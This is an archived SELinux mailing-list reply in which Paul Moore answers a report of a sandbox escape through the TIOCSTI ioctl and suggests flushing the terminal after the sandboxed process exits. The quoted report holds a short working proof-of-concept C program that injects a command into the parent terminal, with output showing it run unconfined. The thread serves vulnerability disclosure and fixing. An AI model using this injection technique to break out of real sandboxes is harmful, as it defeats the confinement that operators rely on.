Received: from goalie.tycho.ncsc.mil (goalie [144.51.242.250])
 by tarius.tycho.ncsc.mil (8.14.4/8.14.4) with ESMTP id u8NDSGAA019749
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 09:28:16 -0400
Received: by mail-ua0-f175.google.com with SMTP id 15so39295782uai.3
 for <selinux@tycho.nsa.gov>; Fri, 23 Sep 2016 06:28:14 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
References: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
From: Paul Moore <paul@paul-moore.com>
Date: Fri, 23 Sep 2016 09:28:13 -0400
Message-ID: <CAHC9VhRpJQyeopPfhPOH6JSm+A0DLNXqQvW3EVY5YVymZD0qPg@mail.gmail.com>
Subject: Re: SELinux sandbox escape via TIOCSTI ioctl
To: up201407890@alunos.dcc.fc.up.pt, selinux@tycho.nsa.gov
Content-Type: text/plain; charset=UTF-8
List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
 <selinux.tycho.nsa.gov>
List-Post: <mailto:selinux@tycho.nsa.gov>
List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>

On Fri, Sep 23, 2016 at 5:23 AM,  <up201407890@alunos.dcc.fc.up.pt> wrote:
> Hi,
>
> When executing a program via the SELinux sandbox, the nonpriv session can
> escape to the parent session by using the TIOCSTI ioctl to push characters
> into the terminal's input buffer, allowing an attacker to escape the
> sandbox.
>
> $ cat test.c
> #include <unistd.h>
> #include <sys/ioctl.h>
>
> int main()
> {
>   char *cmd = "id\n";
>   while(*cmd)
>    ioctl(0, TIOCSTI, cmd++);
>   execlp("/bin/id", "id", NULL);
> }
>
> $ gcc test.c -o test
> $ /bin/sandbox ./test
> id
> uid=1000 gid=1000 groups=1000
> context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
> $ id    <------ did not type this
> uid=1000(saken) gid=1000(saken) groups=1000(saken)
> context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

I've only just started looking at this, but it seems like we need a
call to tcflush()/ioctl(TCFLSH) in the sandbox tool immediately after
the sandboxed process exits.  Do any of the userspace tools guys have
any other ideas?

-- 
paul moore
www.paul-moore.com
